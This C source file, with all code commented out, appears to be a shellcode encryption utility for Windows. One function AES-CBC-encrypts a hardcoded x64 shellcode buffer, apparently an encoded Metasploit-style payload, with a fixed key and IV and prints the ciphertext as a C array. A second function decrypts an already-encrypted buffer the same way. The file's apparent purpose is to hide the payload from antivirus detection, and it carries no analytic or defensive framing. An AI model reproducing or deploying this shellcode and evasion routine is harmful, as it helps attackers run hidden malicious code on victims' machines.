#define _CRT_SECURE_NO_DEPRECATE
#include "Windows.h"
#include "stdio.h"
#include "aes.hpp"

////º”√‹
//int main(int argc, char* argv[])
//{
//	unsigned char buf[] =
//		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
//		"\xff\xff\x48\xbb\x19\x5a\x0e\x8c\xb0\xca\x4b\xd7\x48\x31\x58"
//		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe5\x12\x8d\x68\x40\x22"
//		"\x8b\xd7\x19\x5a\x4f\xdd\xf1\x9a\x19\x86\x4f\x12\x3f\x5e\xd5"
//		"\x82\xc0\x85\x79\x12\x85\xde\xa8\x82\xc0\x85\x39\x12\x85\xfe"
//		"\xe0\x82\x44\x60\x53\x10\x43\xbd\x79\x82\x7a\x17\xb5\x66\x6f"
//		"\xf0\xb2\xe6\x6b\x96\xd8\x93\x03\xcd\xb1\x0b\xa9\x3a\x4b\x1b"
//		"\x5f\xc4\x3b\x98\x6b\x5c\x5b\x66\x46\x8d\x60\x41\xcb\x5f\x19"
//		"\x5a\x0e\xc4\x35\x0a\x3f\xb0\x51\x5b\xde\xdc\x3b\x82\x53\x93"
//		"\x92\x1a\x2e\xc5\xb1\x1a\xa8\x81\x51\xa5\xc7\xcd\x3b\xfe\xc3"
//		"\x9f\x18\x8c\x43\xbd\x79\x82\x7a\x17\xb5\x1b\xcf\x45\xbd\x8b"
//		"\x4a\x16\x21\xba\x7b\x7d\xfc\xc9\x07\xf3\x11\x1f\x37\x5d\xc5"
//		"\x12\x13\x93\x92\x1a\x2a\xc5\xb1\x1a\x2d\x96\x92\x56\x46\xc8"
//		"\x3b\x8a\x57\x9e\x18\x8a\x4f\x07\xb4\x42\x03\xd6\xc9\x1b\x56"
//		"\xcd\xe8\x94\x12\x8d\x58\x02\x4f\xd5\xf1\x90\x03\x54\xf5\x7a"
//		"\x4f\xde\x4f\x2a\x13\x96\x40\x00\x46\x07\xa2\x23\x1c\x28\xe6"
//		"\xa5\x53\xc5\x0e\xbd\x38\xe5\x46\x69\x3c\x8c\xb0\x8b\x1d\x9e"
//		"\x90\xbc\x46\x0d\x5c\x6a\x4a\xd7\x19\x13\x87\x69\xf9\x76\x49"
//		"\xd7\x1d\x88\xce\x24\xee\x47\x0a\x83\x50\xd3\xea\xc0\x39\x3b"
//		"\x0a\x6d\x55\x2d\x28\x8b\x4f\x1f\x07\x5e\xf3\x32\x0f\x8d\xb0"
//		"\xca\x12\x96\xa3\x73\x8e\xe7\xb0\x35\x9e\x87\x49\x17\x3f\x45"
//		"\xfd\xfb\x8b\x9f\xe6\x9a\x46\x05\x72\x82\xb4\x17\x51\xd3\xcf"
//		"\xcd\x0a\x20\x44\x08\xf9\xa5\xdb\xc4\x39\x0d\x21\xc7\x58\x02"
//		"\x42\x05\x52\x82\xc2\x2e\x58\xe0\x97\x29\xc4\xab\xb4\x02\x51"
//		"\xdb\xca\xcc\xb2\xca\x4b\x9e\xa1\x39\x63\xe8\xb0\xca\x4b\xd7"
//		"\x19\x1b\x5e\xcd\xe0\x82\xc2\x35\x4e\x0d\x59\xc1\x81\x0a\x21"
//		"\xda\x40\x1b\x5e\x6e\x4c\xac\x8c\x93\x3d\x0e\x0f\x8d\xf8\x47"
//		"\x0f\xf3\x01\x9c\x0e\xe4\xf8\x43\xad\x81\x49\x1b\x5e\xcd\xe0"
//		"\x8b\x1b\x9e\xe6\x9a\x4f\xdc\xf9\x35\x83\x9a\x90\x9b\x42\x05"
//		"\x71\x8b\xf1\xae\xd5\x65\x88\x73\x65\x82\x7a\x05\x51\xa5\xc4"
//		"\x07\xbe\x8b\xf1\xdf\x9e\x47\x6e\x73\x65\x71\xbb\x62\xbb\x0c"
//		"\x4f\x36\x16\x5f\xf6\x4a\xe6\x8f\x46\x0f\x74\xe2\x77\xd1\x65"
//		"\x50\x8e\x77\x50\xbf\x4e\x6c\x5e\x49\x7c\xe3\xda\xca\x12\x96"
//		"\x90\x80\xf1\x59\xb0\xca\x4b\xd7";
//
//	SIZE_T bufSize = sizeof(buf);
//
//	unsigned char key[] = "fengwenhuafengwenhuafengwenhua.";
//	unsigned char iv[] = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
//
//	struct AES_ctx ctx;
//	AES_init_ctx_iv(&ctx, key, iv);
//	AES_CBC_encrypt_buffer(&ctx, buf, bufSize);
//
//	printf("Encrypted buffer:\n");
//
//	printf("unsigned char buf[] =\n");
//	int count = 0;
//	for (int i = 0; i < bufSize - 1; i++) {
//		if (count == 0) {
//			printf("\"");
//		}
//		printf("\\x%02x", buf[i]);
//		count++;
//		if (count == 15) {
//			printf("\"\n");
//			count = 0;
//		}
//	}
//	printf("\";\n");
//	system("pause");
//	return 0;
//}

//// Ω‚√‹
//int main(int argc, char* argv[])
//{
//	unsigned char buf[] =
//		"\x3c\x90\x5c\xd5\x78\x34\x35\xca\x5d\xc0\x8e\x85\x58\x73\x1b"
//		"\xf8\x77\x2c\xf1\x69\xa1\x9d\x52\xa0\x22\x3e\x21\xf1\x53\x43"
//		"\x38\x45\xd1\xa8\x2d\x0a\xc9\x28\xf6\x0d\x15\x6f\x01\xeb\xb9"
//		"\x0b\xcb\xc0\x47\x3f\xff\x7e\x96\x75\x9d\xad\xc6\xa6\x5a\x1f"
//		"\xef\x8b\xa6\xba\xc8\xe8\x3b\x99\xc0\x4c\xa3\xfe\xf8\xa0\x6f"
//		"\xaf\xd1\x6d\xaa\x7a\x9c\x44\xc1\x75\x46\x73\x61\xc3\xf0\x8d"
//		"\x3b\x37\xc8\x78\x69\xa3\x98\x15\xca\x01\x47\xdc\x60\x78\x29"
//		"\xbb\x55\x2d\x63\x8d\x19\xcc\x25\x41\xab\xf0\x98\xf2\x0b\xc1"
//		"\x89\xb0\x69\xa5\xd1\x68\xae\x1c\xe0\xa8\x61\xd0\x55\xa9\x43"
//		"\x8f\x9d\xf3\x92\xd7\x70\x89\x22\xe9\x96\xef\xa7\x2b\x91\x59"
//		"\x32\xb0\xc9\x78\x70\xc1\x80\xd1\xcd\x79\x0a\x22\x25\xad\x0c"
//		"\x1e\xc1\xf2\x4e\x7e\x5d\x88\x73\x1d\xff\x3e\x18\x34\xb3\xfc"
//		"\x7e\x46\x58\x6b\xad\xeb\xf2\x44\xca\xdf\x41\xea\xb0\x5b\x72"
//		"\xcb\x9f\x79\xee\x80\x02\x91\xe5\xb2\xe0\xfa\x2d\x5a\x54\x9e"
//		"\x56\x61\x8d\xd1\x77\xc5\x92\xbc\xa5\x78\x87\xe2\x34\xc4\x1d"
//		"\x58\xa6\xcf\xca\xf2\x7a\x1e\x23\xe6\xa1\xa8\xcb\xde\xe8\x3f"
//		"\xfd\x8c\x77\xb8\x46\xc7\x3e\x50\x16\x35\x1d\x92\xd1\x16\x04"
//		"\x7e\xf9\xe7\xc7\x66\xaf\xb1\xe8\x38\xc2\x81\x68\xd8\x7b\xc0"
//		"\xb8\x0e\x3e\xa7\x8c\xad\xe8\x95\x6d\x53\x33\x45\xfe\xa5\x5b"
//		"\x8e\x88\xbc\x9f\x77\x09\xcc\xef\x63\x8f\x68\xa0\xd8\x0d\xfb"
//		"\x7b\x90\xa8\x66\x07\xf1\x37\x11\x1d\x08\x94\x98\x02\x4f\x7c"
//		"\x88\xec\x6e\x4e\x95\xc0\xb8\xf2\xe0\xf5\xd4\xaf\x29\xac\x7e"
//		"\xdd\x42\x98\x6e\xf9\x6a\xa0\x53\x1d\x1c\x4c\x89\x34\xf7\xe0"
//		"\x26\xc6\x72\xf9\x2a\x2f\xbf\x85\xb3\x2d\xf0\x34\x4a\x4a\x12"
//		"\x71\x39\x48\xbe\x51\xcb\x54\x15\x3d\x2e\x01\x94\xa9\x75\x3e"
//		"\xc6\x98\x15\x36\x7f\xcf\x77\x33\xce\x4c\xe3\x5d\xfe\x2c\xbb"
//		"\xd9\x09\xa5\xc2\x90\x01\x7e\x88\x7d\xf3\xfb\xdc\xa9\x93\x07"
//		"\xaa\xc8\x5e\x68\x05\x7e\xd9\xb3\x2c\x54\xc0\xf9\x4a\x4b\x31"
//		"\x62\x4e\xc0\x35\x2d\x20\xb4\xaf\x3a\xcd\x26\xe9\xcc\x50\xa3"
//		"\x4c\x02\xce\xe5\xbb\x96\xc3\xcd\x85\x75\x82\xe0\x44\x6f\x55"
//		"\x61\xbe\xf9\xaa\x46\x49\x4f\x01\x38\x91\x0f\x8f\xfb\x02\xbf"
//		"\x89\x3f\xe3\x1e\x1b\x63\x77\xfe\x0e\x69\xdf\x89\x22\x20\x5e"
//		"\x0c\xf3\x76\x80\x95\x6f\xf3\xee\x3e\x9f\xb1\x75\xbf\x44\x3d"
//		"\xb5\x4b\xab\x7d\x03\x86\xb0\xdc";
//
//	SIZE_T bufSize = sizeof(buf);
//
//	unsigned char key[] = "fengwenhuafengwenhuafengwenhua.";
//	unsigned char iv[] = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
//
//	struct AES_ctx ctx;
//	AES_init_ctx_iv(&ctx, key, iv);
//	AES_CBC_decrypt_buffer(&ctx, buf, bufSize);
//
//	printf("Decrypted buffer:\n");
//
//	printf("unsigned char buf[] =\n");
//	int count = 0;
//	for (int i = 0; i < bufSize - 1; i++) {
//		if (count == 0) {
//			printf("\"");
//		}
//		printf("\\x%02x", buf[i]);
//		count++;
//		if (count == 15) {
//			printf("\"\n");
//			count = 0;
//		}
//	}
//	printf("\";\n");
//	system("pause");
//	return 0;
//}